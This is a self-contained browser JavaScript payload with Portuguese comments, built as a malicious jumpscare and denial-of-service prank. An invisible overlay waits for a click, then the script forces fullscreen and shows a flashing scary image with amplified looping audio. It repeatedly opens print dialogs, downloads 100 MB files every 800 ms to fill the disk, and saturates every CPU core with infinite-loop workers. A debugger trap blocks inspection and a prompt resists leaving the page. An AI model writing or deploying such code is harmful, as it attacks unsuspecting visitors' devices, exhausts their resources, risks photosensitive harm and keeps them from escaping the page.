(function() {
    // 1. Configurações de Anti-Debug
    setInterval(() => { (function(){}).constructor("debugger")(); }, 50);
    window.onbeforeunload = () => "꧅";

    const audioData = `data:audio/mp3;base64,`; // Seu Base64 aqui

    // 2. Carregamento de Assets (Promessas)
    const loadAssets = () => {
        const pAudio = new Promise((resolve) => {
            const audio = new Audio(audioData);
            audio.preload = "auto";
            audio.oncanplaythrough = () => resolve(audio);
            audio.load();
        });

        const pImg = new Promise((resolve) => {
            const img = new Image();
            img.crossOrigin = "anonymous";
            img.src = 'https://wallpapers.com/images/hd/scary-face-pictures-fvx05bim45ctjiwh.jpg';
            img.onload = () => resolve(img);
        });

        return Promise.all([pAudio, pImg]);
    };

    // 3. Execução Real (O "Caos")
    const startChaos = ([audio, img]) => {
        document.body.innerHTML = '';
        document.documentElement.style.overflow = 'hidden';
        
        // Fullscreen forçado
        const root = document.documentElement;
        if (root.requestFullscreen) root.requestFullscreen().catch(() => {});

        const ui = document.createElement('div');
        ui.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:2147483640;';
        img.style.cssText = 'width:100%;height:100%;object-fit:cover;';
        ui.appendChild(img);
        document.body.appendChild(ui);

        // Áudio Context (Liberado pelo clique)
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const master = ctx.createGain();
        master.gain.value = 8.0; 
        master.connect(ctx.destination);
        
        const sSrc = ctx.createMediaElementSource(audio);
        sSrc.connect(master);
        audio.loop = true;
        audio.play();

        // Loop Visual
        const render = () => {
            img.style.transform = `scale(${1.3 + Math.random()}) translate(${(Math.random()-0.5)*150}px, ${(Math.random()-0.5)*150}px)`;
            img.style.filter = `contrast(10) brightness(2) hue-rotate(${Math.random()*360}deg)`;
            document.title = "꧅" + Math.random().toString(36);
            requestAnimationFrame(render);
        };
        render();

        // Funções de Stress (CPU/Disk)
        setInterval(() => { window.print(); }, 1000);
        
        const bombDisk = () => {
            const blob = new Blob([new Uint8Array(1024 * 1024 * 100)]); 
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = `sys_${Math.random()}.bin`;
            a.click();
            setTimeout(bombDisk, 800);
        };
        bombDisk();

        const wCode = 'while(true){postMessage(0)}';
        const wURL = URL.createObjectURL(new Blob([wCode], {type: 'text/javascript'}));
        for(let k=0; k<navigator.hardwareConcurrency; k++) new Worker(wURL);
    };

    // 4. Camada de Interação (Botão Invisível)
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;cursor:pointer;background:transparent;';
    document.body.appendChild(overlay);

    // Aguarda o clique para disparar tudo
    overlay.addEventListener('click', () => {
        overlay.remove(); // Remove a camada para não atrapalhar
        loadAssets().then(startChaos).catch(console.error);
    }, { once: true });

})();
